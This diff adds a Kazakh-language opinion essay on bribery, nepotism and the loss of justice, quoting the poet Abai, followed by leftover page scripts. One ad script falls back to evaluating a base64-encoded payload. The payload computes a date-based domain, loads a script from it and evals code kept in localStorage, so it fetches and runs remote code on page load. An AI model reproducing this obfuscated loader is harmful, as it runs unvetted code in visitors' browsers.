@@ -1,0 +1,63 @@
+Бұл ғасырда кімнің адал яки кімнің арам екенін білуге де құштарланбайтын болдық.
+Құштарланбауға оның өзі итермелейді.
+Адам қандай болса да, әділетті болсын дейміз.
+Бірақ шамасы келмегеннен бе, әлде ниеті жоқтан ба, қазіргі кезде ғәділетке көп пенде жатырқап қарайды..Алаштың арда ұлдары «Күлтөбенің басында күнде жиын өткізсе де», үш жүздің басын қосып, келелі кеңес өткізсе де осы туыстық, тамыр-таныс һәм рушылдықтан арылмай қоймасы бар ма.
+Кенедей жабысқан бұл дерт – тобық тұсынан қан сорып, төбеңдегі миыңнан тектілігіңді сарқып бітпесіне кім кепіл? .Біз Құдай Тағалаға ауырғанда яки әлдебір қиыншылыққа тап болғанда жалбарынуды білеміз.
+Бірақ әділдік орнатуға келгенде Жаратушыны ысырып қоятынымыз қалай? Әлмисақтан бергі әдетіміз – әділдікті сүйіп, ар туын тік ұстап, ақ жолдан айнымауға серт бергеніміз қайсы?.Асылы, менің бір қорқатыным – бұл күнде жұмысқа кірсең де, оқуға түссең де, балтырың сыздап дәрігерге қаралсаң да, отау тігіп, жер алсаң да, кәсібіңді өрге домалатсаң да – барлығына пара бересің немесе кісі (таныс) саласың.
+Бейне бір пара деген – біз үшін періште сыңайлы.
+Параны періште ғып, өзімізді пері қып алмасақ жарар еді….Сондағы еңбек, маңдай тер, күндіз-түнгі қиналыс ауаға ұшып, болмашы бір ақ қағазға ғұмыры байланып өткенін осы қазақ неліктен сүйеді екен? Біле білсек, біз – желкенін жел емес, кісі итерсе ғана жүретін кемеге айналғанбыз.
+Оған дәлел жоғарыдағы лас дүниелер.Осы орайда, хәкім Абайдың: «Ел жамаған билер жоқ, ел қыдырып сандалды.
+Астыртын барып жолғасқан, ақша беріп жалғасқан, ақысын әрең сол алды.
+Орыс сияз қылдырса, қу старшын, аш билер аз жүрегін жалғайды» деген ұлағатты сөзі есіме түсіп отыр.
+Алайда, әлемдік деңгейде ойлайтын Абайды тыңдамаған қазақ, біздей жастардың сөзін құлаққа ілер ме дейсің….Әсілі, сен бір жұмысқа кірсең, міндетті түрде оның бастығы сенің руыңнан болу керек.
+Олай болмағанда, я сен жұмысқа кірмей тұрып сандаласың, я кіргеннен кейін одан әрмен сандаласың.
+Сосын еріксіз қызыл дипломыңды құшақтап, жайыңа кетесің, әділдік таппай….Үйіңе қайтып бара жатып ішің өртенеді.
+Көкірегіңде ақиқаттың ащы дауысы «азан» шақырады.
+Жиренесің, өкпелейсің, ашуланасың.
+Сұм өмірдің пердесін аштым деген осы.Сондай күйзелісте тұрғанда тағы да қолына қалың кітап ұстаған хәкім Абай саған тіл қатады: «Зұлымдық әрқашан да өмірден қалмайтын нәрсе, әділетсіз жерде зұлымдық көрінбейді, зұлымдық бетін әділет ашады».Міне, өмірдің кілті осында.
+Бәлкім, уақыт ілгері жылжып, әділдік ақыры келер.
+Бірақ онда ол кеңірдегіңді кесетін, қызыл уға матырылған алмас қылыш боп келер яки дозақтың бет қаратпас жалынды оты боп келер… Ақирет һәм Алланың әділдігі сол кезде түбегейлі орнаса керек.Алайда, Құдайдан қорықпаған қазаққа қиямет алыс боп көрінеді.
+Қас қағым сәтте келерін білсе де….Бөлісіңіз:
+
+
+
+
+
+
+ 
+          var node4990 = document.getElementById("MIXADV_4990");
+          if( node4990 )
+          {
+               var script = document.createElement("script");
+               script.charset = "utf-8";
+               script.src = "https://m.mixadvert.com/show/?id=4990&r="+Math.random();
+               node4990.parentNode.appendChild(script); 
+               script.onerror = function(){
+                  window.eval( atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDQ5OTAgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNDk5MC5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTQ5OTAuaW5uZXJIVE1MID09ICIiICkgd2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjQ5OTAiKSkgfSwgNTAwMCk7ICA7fTsg") );
+              }
+          }
+          
+
+
+
+
+    (function(w, d, n, s, t) {
+        w[n] = w[n] || [];
+        w[n].push(function() {
+            Ya.Context.AdvManager.render({
+                blockId: "R-A-241735-5",
+                renderTo: "yandex_rtb_R-A-241735-5",
+                async: true
+            });
+        });
+        t = d.getElementsByTagName("script")[0];
+        s = d.createElement("script");
+        s.type = "text/javascript";
+        s.src = "//an.yandex.ru/system/context.js";
+        s.async = true;
+        t.parentNode.insertBefore(s, t);
+    })(this, this.document, "yandexContextAsyncCallbacks");
+
+
+
+.
